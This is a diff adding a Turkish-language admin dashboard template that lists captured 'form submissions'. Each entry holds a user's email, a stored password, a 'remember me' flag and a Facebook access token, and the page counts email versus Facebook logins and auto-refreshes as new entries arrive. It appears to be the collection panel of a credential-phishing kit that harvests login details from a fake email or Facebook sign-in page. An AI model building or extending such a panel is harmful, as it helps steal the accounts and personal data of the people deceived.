@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Paneli - Form Verileri</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 2rem 0;
+            margin-bottom: 2rem;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #667eea;
+            display: block;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+        
+        .data-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .data-header {
+            background: #f8f9fa;
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid #e9ecef;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .data-header h2 {
+            margin: 0;
+            color: #333;
+        }
+        
+        .refresh-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: background 0.3s;
+        }
+        
+        .refresh-btn:hover {
+            background: #5a67d8;
+        }
+        
+        .data-list {
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        
+        .data-item {
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid #f0f0f0;
+            transition: background 0.2s;
+        }
+        
+        .data-item:hover {
+            background: #f8f9fa;
+        }
+        
+        .data-item:last-child {
+            border-bottom: none;
+        }
+        
+        .item-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        
+        .item-type {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            background: #e3f2fd;
+            color: #1976d2;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        
+        .item-type.facebook {
+            background: #e8f5e8;
+            color: #2e7d32;
+        }
+        
+        .item-time {
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        .item-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        
+        .detail-item {
+            color: #555;
+            font-size: 0.9rem;
+        }
+        
+        .detail-label {
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 3rem;
+            color: #666;
+        }
+        
+        .no-data i {
+            font-size: 3rem;
+            color: #ddd;
+            margin-bottom: 1rem;
+        }
+        
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.9);
+            color: #667eea;
+            text-decoration: none;
+            padding: 0.75rem 1rem;
+            border-radius: 25px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+        
+        .back-btn:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .item-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+        }
+    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <a href="/" class="back-btn">
+        <i class="fas fa-arrow-left"></i> Ana Sayfa
+    </a>
+    
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-chart-bar"></i> Admin Paneli</h1>
+            <p>Form Gönderim Verileri ve İstatistikler</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <span class="stat-number">{{ submissions|length }}</span>
+                <div class="stat-label">Toplam Gönderim</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">
+                    {{ submissions|selectattr('login_method', 'equalto', 'email')|list|length + 
+                       submissions|selectattr('login_method', 'equalto', 'email_initial')|list|length }}
+                </span>
+                <div class="stat-label">Email Girişi</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">
+                    {{ submissions|selectattr('login_method', 'equalto', 'facebook')|list|length + 
+                       submissions|selectattr('login_method', 'equalto', 'facebook_initial')|list|length }}
+                </span>
+                <div class="stat-label">Facebook Girişi</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-number">{{ submissions|selectattr('remember_me', 'equalto', true)|list|length }}</span>
+                <div class="stat-label">Beni Hatırla</div>
+            </div>
+        </div>
+        
+        <div class="data-container">
+            <div class="data-header">
+                <h2><i class="fas fa-database"></i> Form Verileri</h2>
+                <button class="refresh-btn" onclick="window.location.reload()">
+                    <i class="fas fa-sync-alt"></i> Yenile
+                </button>
+            </div>
+            
+            <div class="data-list">
+                {% if submissions %}
+                    {% for submission in submissions|reverse %}
+                    <div class="data-item">
+                        <div class="item-header">
+                            <span class="item-type {{ 'facebook' if 'facebook' in submission.login_method else 'email' }}">
+                                <i class="fab fa-facebook-f" style="display: {{ 'inline' if 'facebook' in submission.login_method else 'none' }}"></i>
+                                <i class="fas fa-envelope" style="display: {{ 'none' if 'facebook' in submission.login_method else 'inline' }}"></i>
+                                {{ submission.login_method|title|replace('_', ' ') }}
+                            </span>
+                            <span class="item-time">
+                                <i class="fas fa-clock"></i>
+                                {{ submission.timestamp[:19]|replace('T', ' ') }}
+                            </span>
+                        </div>
+                        
+                        <div class="item-details">
+                            <div class="detail-item">
+                                <span class="detail-label">ID:</span> #{{ submission.id }}
+                            </div>
+                            
+                            {% if submission.email %}
+                            <div class="detail-item">
+                                <span class="detail-label">Email:</span> {{ submission.email }}
+                            </div>
+                            {% endif %}
+                            
+                            {% if submission.password %}
+                            <div class="detail-item">
+                                <span class="detail-label">Şifre:</span> {{ '*' * (submission.password|length) }}
+                            </div>
+                            {% endif %}
+                            
+                            {% if submission.remember_me is defined %}
+                            <div class="detail-item">
+                                <span class="detail-label">Beni Hatırla:</span> 
+                                {{ 'Evet' if submission.remember_me else 'Hayır' }}
+                            </div>
+                            {% endif %}
+                            
+                            {% if submission.access_token %}
+                            <div class="detail-item">
+                                <span class="detail-label">Token:</span> {{ submission.access_token[:20] }}...
+                            </div>
+                            {% endif %}
+                            
+                            <div class="detail-item">
+                                <span class="detail-label">Tür:</span> {{ submission.type|title }}
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div class="no-data">
+                        <i class="fas fa-inbox"></i>
+                        <h3>Henüz veri yok</h3>
+                        <p>Form gönderileri burada görünecek</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Auto refresh every 30 seconds
+        setInterval(() => {
+            const refreshBtn = document.querySelector('.refresh-btn i');
+            refreshBtn.classList.add('fa-spin');
+            setTimeout(() => {
+                refreshBtn.classList.remove('fa-spin');
+            }, 1000);
+        }, 30000);
+        
+        // Real-time update (optional)
+        function checkForUpdates() {
+            fetch('/get-submissions')
+                .then(response => response.json())
+                .then(data => {
+                    const currentCount = document.querySelector('.stat-number').textContent;
+                    if (data.length != currentCount) {
+                        window.location.reload();
+                    }
+                })
+                .catch(error => console.log('Update check failed:', error));
+        }
+        
+        // Check for updates every 10 seconds
+        setInterval(checkForUpdates, 10000);
+    </script>
+</body>
+</html>
